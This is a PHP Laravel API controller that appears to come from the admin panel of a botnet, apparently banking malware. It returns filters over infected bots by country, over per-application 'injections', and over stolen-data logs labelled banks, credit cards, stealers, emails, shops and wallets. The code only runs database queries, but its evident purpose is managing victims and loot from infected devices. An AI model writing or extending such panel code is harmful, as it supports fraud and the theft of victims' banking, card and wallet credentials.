<?php

namespace App\Http\Controllers\Api\v1;

use App\Dictionary\CountryDictionary;
use App\Helpers\ApiResponse;
use App\Http\Controllers\Controller;
use App\Models\Bot;
use App\Models\BotLog;
use App\Models\Injection;
use Illuminate\Http\JsonResponse;

class FilterController extends Controller
{
    public function show(): JsonResponse
    {
        $countries = Bot::groupBy('country_code')
            ->select('country_code', 'country')
            ->get()
            ->mapWithKeys(function (Bot $country) {
                return [$country->country_code => CountryDictionary::COUNTRIES[strtoupper($country->country_code)] ?? 'Unknown'];
            });

        $injections = Injection::select(['name', 'injections.application', 'type'])
            ->join('bot_injections', 'injections.application', '=', 'bot_injections.application')
            ->groupBy('bot_injections.application')
            ->get()
            ->mapWithKeys(function (Injection $injection) {
                return [
                    $injection->application => [
                        'name' => $injection->name,
                        'type' => $injection->type,
                    ],
                ];
            });

        $logs = BotLog::whereIn('type', [
            'banks',
            'credit_cards',
            'stealers',
            'crypt',
            'shops',
            'emails',
            'wallets',
        ])
            ->groupBy('application')
            ->with('injection')
            ->orderBy('application')
            ->limit(10)
            ->get();

        $applications = $logs->groupBy(function (BotLog $log) {
            return $log->type;
        });

        /** @var Bot|null $bot */
        $bot = Bot::select('created_at')
            ->orderByDesc('created_at')
            ->first();

        $start_date = $bot?->created_at
            ?->format('Y-m-d H:i:s');

        $filters = [
            'countries' => $countries,
            'injections' => $injections,
            'start_date' => $start_date,
            'applications' => $applications,
        ];

        return ApiResponse::success($filters);
    }
}
